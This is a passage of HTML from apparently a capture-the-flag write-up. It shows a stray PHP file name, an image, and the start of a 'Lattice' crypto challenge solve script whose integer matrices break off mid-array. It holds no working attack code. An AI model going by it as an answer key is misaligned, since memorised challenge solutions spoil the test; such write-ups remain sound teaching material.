n></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>rqxvweqtyfshbs.php</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fb415a6d4e55018f1d285c3576f49204.png"></p><hr><h3 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> unpad<span class="token comment"># Given data</span>P <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">87</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">41</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">121</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">89</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">111</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">54</span><span class="token punctuation">]</span><span class="token punctuation">]</span>C <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token 